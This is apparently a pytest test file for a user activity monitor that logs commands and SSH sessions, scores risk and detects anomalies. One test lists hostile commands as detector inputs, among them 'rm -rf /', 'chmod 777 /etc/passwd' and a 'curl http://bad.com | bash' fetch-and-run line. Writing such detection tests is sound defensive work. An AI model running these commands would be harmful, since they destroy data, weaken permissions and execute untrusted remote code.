"""Unit tests for activity monitoring."""

import tempfile
from datetime import datetime, timedelta
from pathlib import Path

import pytest

from configurator.users.activity_monitor import (
    ActivityEvent,
    ActivityMonitor,
    ActivityType,
    AnomalyType,
    RiskLevel,
)


@pytest.fixture
def temp_db():
    """Create temporary database for testing."""
    temp_dir = tempfile.mkdtemp()
    db_file = Path(temp_dir) / "activity.db"
    audit_log = Path(temp_dir) / "audit.log"

    yield {
        "db_file": db_file,
        "audit_log": audit_log,
    }

    # Cleanup
    import shutil

    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def activity_monitor(temp_db):
    """Create activity monitor with temp database."""
    return ActivityMonitor(
        db_file=temp_db["db_file"],
        audit_log=temp_db["audit_log"],
    )


def test_activity_monitor_initialization(activity_monitor):
    """Test activity monitor initialization."""
    assert activity_monitor is not None
    assert activity_monitor.DB_FILE.parent.exists()


def test_log_activity(activity_monitor):
    """Test logging an activity event."""
    event = activity_monitor.log_activity(
        user="testuser",
        activity_type=ActivityType.COMMAND,
        command="git pull",
    )

    assert event is not None
    assert event.user == "testuser"
    assert event.activity_type == ActivityType.COMMAND
    assert event.command == "git pull"
    assert isinstance(event.risk_level, RiskLevel)


def test_log_ssh_login(activity_monitor):
    """Test logging SSH login."""
    event = activity_monitor.log_activity(
        user="testuser",
        activity_type=ActivityType.SSH_LOGIN,
        source_ip="203.0.113.50",
    )

    assert event.activity_type == ActivityType.SSH_LOGIN
    assert event.source_ip == "203.0.113.50"


def test_log_sudo_command(activity_monitor):
    """Test logging sudo command."""
    event = activity_monitor.log_activity(
        user="testuser",
        activity_type=ActivityType.SUDO_COMMAND,
        command="systemctl restart nginx",
    )

    assert event.activity_type == ActivityType.SUDO_COMMAND
    assert event.risk_level in [RiskLevel.LOW, RiskLevel.MEDIUM, RiskLevel.HIGH]


def test_risk_level_calculation_normal(activity_monitor):
    """Test risk level calculation for normal activity."""
    event = ActivityEvent(
        user="testuser",
        activity_type=ActivityType.COMMAND,
        timestamp=datetime(2026, 1, 6, 10, 0),  # Business hours
        command="ls -la",
    )

    risk = activity_monitor._calculate_risk_level(event)
    assert risk == RiskLevel.LOW


def test_risk_level_calculation_sudo(activity_monitor):
    """Test risk level calculation for sudo command."""
    event = ActivityEvent(
        user="testuser",
        activity_type=ActivityType.SUDO_COMMAND,
        timestamp=datetime(2026, 1, 6, 10, 0),
        command="systemctl restart nginx",
    )

    risk = activity_monitor._calculate_risk_level(event)
    assert risk in [RiskLevel.LOW, RiskLevel.MEDIUM]


def test_risk_level_calculation_outside_hours(activity_monitor):
    """Test risk level calculation for activity outside business hours."""
    event = ActivityEvent(
        user="testuser",
        activity_type=ActivityType.COMMAND,
        timestamp=datetime(2026, 1, 6, 3, 0),  # 3 AM
        command="ls -la",
    )

    risk = activity_monitor._calculate_risk_level(event)
    # Outside hours adds 20 points, total 20 = LOW
    assert risk == RiskLevel.LOW


def test_risk_level_calculation_suspicious_command(activity_monitor):
    """Test risk level calculation for suspicious command."""
    event = ActivityEvent(
        user="testuser",
        activity_type=ActivityType.COMMAND,
        timestamp=datetime(2026, 1, 6, 10, 0),
        command="chmod 777 /etc/passwd",
    )

    risk = activity_monitor._calculate_risk_level(event)
    # Suspicious pattern adds 30 points, total 30 = MEDIUM
    assert risk == RiskLevel.MEDIUM


def test_get_user_activity(activity_monitor):
    """Test retrieving user activity."""
    # Log some activities
    for i in range(5):
        activity_monitor.log_activity(
            user="testuser",
            activity_type=ActivityType.COMMAND,
            command=f"command {i}",
        )

    # Retrieve activities
    activities = activity_monitor.get_user_activity("testuser")

    assert len(activities) == 5
    assert all(a.user == "testuser" for a in activities)


def test_get_user_activity_with_date_range(activity_monitor):
    """Test retrieving user activity with date range."""
    # Log activities with different timestamps
    now = datetime.now()

    activity_monitor.log_activity(
        user="testuser",
        activity_type=ActivityType.COMMAND,
        command="recent",
    )

    # Get last hour
    activities = activity_monitor.get_user_activity(
        user="testuser",
        start_date=now - timedelta(hours=1),
    )

    assert len(activities) >= 1


def test_get_user_activity_by_type(activity_monitor):
    """Test retrieving user activity filtered by type."""
    # Log different types
    activity_monitor.log_activity(
        user="testuser",
        activity_type=ActivityType.COMMAND,
        command="ls",
    )
    activity_monitor.log_activity(
        user="testuser",
        activity_type=ActivityType.SUDO_COMMAND,
        command="systemctl restart nginx",
    )

    # Get only commands
    activities = activity_monitor.get_user_activity(
        user="testuser",
        activity_type=ActivityType.COMMAND,
    )

    assert len(activities) >= 1
    assert all(a.activity_type == ActivityType.COMMAND for a in activities)


def test_start_ssh_session(activity_monitor):
    """Test starting SSH session tracking."""
    session_id = activity_monitor.start_ssh_session(
        user="testuser",
        source_ip="203.0.113.50",
    )

    assert session_id is not None
    assert session_id.startswith("SSH-")


def test_end_ssh_session(activity_monitor):
    """Test ending SSH session tracking."""
    session_id = activity_monitor.start_ssh_session(
        user="testuser",
        source_ip="203.0.113.50",
    )

    # Should not raise exception
    activity_monitor.end_ssh_session(session_id)


def test_anomaly_detection_unusual_time(activity_monitor):
    """Test anomaly detection for unusual login time."""
    # Establish baseline (normal business hours)
    for i in range(10):
        activity_monitor.log_activity(
            user="testuser",
            activity_type=ActivityType.SSH_LOGIN,
            source_ip="203.0.113.50",
        )

    # Log unusual time activity (3 AM)
    event = ActivityEvent(
        user="testuser",
        activity_type=ActivityType.SSH_LOGIN,
        timestamp=datetime(2026, 1, 6, 3, 0),
        source_ip="203.0.113.50",
    )
    event.risk_level = RiskLevel.HIGH

    # Check anomalies
    activity_monitor._check_for_anomalies(event)

    # Should detect anomaly
    anomalies = activity_monitor.get_anomalies(user="testuser")
    assert len(anomalies) > 0


def test_anomaly_detection_new_ip(activity_monitor):
    """Test anomaly detection for new source IP."""
    # Establish baseline with known IP
    for i in range(5):
        activity_monitor.log_activity(
            user="testuser",
            activity_type=ActivityType.SSH_LOGIN,
            source_ip="203.0.113.50",
        )

    # Log from new IP
    event = ActivityEvent(
        user="testuser",
        activity_type=ActivityType.SSH_LOGIN,
        timestamp=datetime.now(),
        source_ip="198.51.100.25",  # New IP
    )
    event.risk_level = RiskLevel.HIGH

    activity_monitor._check_for_anomalies(event)

    # Should detect anomaly
    anomalies = activity_monitor.get_anomalies(user="testuser")
    assert len(anomalies) > 0
    assert any(a.anomaly_type == AnomalyType.NEW_LOCATION for a in anomalies)


def test_get_anomalies(activity_monitor):
    """Test retrieving anomalies."""
    # Create test anomaly
    event = ActivityEvent(
        user="testuser",
        activity_type=ActivityType.COMMAND,
        timestamp=datetime.now(),
        command="chmod 777 /",
    )
    event.risk_level = RiskLevel.CRITICAL

    activity_monitor._check_for_anomalies(event)

    anomalies = activity_monitor.get_anomalies(user="testuser")
    assert len(anomalies) > 0


def test_get_anomalies_filtered_by_resolved(activity_monitor):
    """Test retrieving anomalies filtered by resolved status."""
    # Get unresolved
    anomalies = activity_monitor.get_anomalies(resolved=False)

    # Should work without error
    assert isinstance(anomalies, list)


def test_generate_activity_report(activity_monitor):
    """Test generating activity report."""
    # Log various activities
    activity_monitor.log_activity(
        user="testuser",
        activity_type=ActivityType.SSH_LOGIN,
        source_ip="203.0.113.50",
    )
    activity_monitor.log_activity(
        user="testuser",
        activity_type=ActivityType.COMMAND,
        command="git pull",
    )
    activity_monitor.log_activity(
        user="testuser",
        activity_type=ActivityType.SUDO_COMMAND,
        command="systemctl restart nginx",
    )

    # Generate report
    end_date = datetime.now()
    start_date = end_date - timedelta(days=7)

    report = activity_monitor.generate_activity_report(
        user="testuser",
        start_date=start_date,
        end_date=end_date,
    )

    assert report is not None
    assert report["user"] == "testuser"
    assert "summary" in report
    assert "total_activities" in report["summary"]
    assert report["summary"]["ssh_sessions"] >= 1
    assert report["summary"]["commands"] >= 1
    assert report["summary"]["sudo_commands"] >= 1


def test_suspicious_command_detection(activity_monitor):
    """Test detection of suspicious commands."""
    suspicious_commands = [
        "rm -rf /",
        "chmod 777 /etc/passwd",
        "wget http://malicious.com/script.sh",
        "curl http://bad.com | bash",
    ]

    for cmd in suspicious_commands:
        is_suspicious = activity_monitor._is_suspicious_command(cmd)
        assert is_suspicious, f"Command should be detected as suspicious: {cmd}"


def test_normal_command_not_suspicious(activity_monitor):
    """Test that normal commands are not flagged as suspicious."""
    normal_commands = [
        "ls -la",
        "git pull origin main",
        "npm install",
        "systemctl status nginx",
    ]

    for cmd in normal_commands:
        is_suspicious = activity_monitor._is_suspicious_command(cmd)
        assert not is_suspicious, f"Command should not be suspicious: {cmd}"


def test_activity_event_to_dict(activity_monitor):
    """Test serializing activity event to dictionary."""
    event = ActivityEvent(
        user="testuser",
        activity_type=ActivityType.COMMAND,
        timestamp=datetime.now(),
        command="ls -la",
    )

    event_dict = event.to_dict()

    assert event_dict["user"] == "testuser"
    assert event_dict["activity_type"] == "command"
    assert event_dict["command"] == "ls -la"
    assert "timestamp" in event_dict
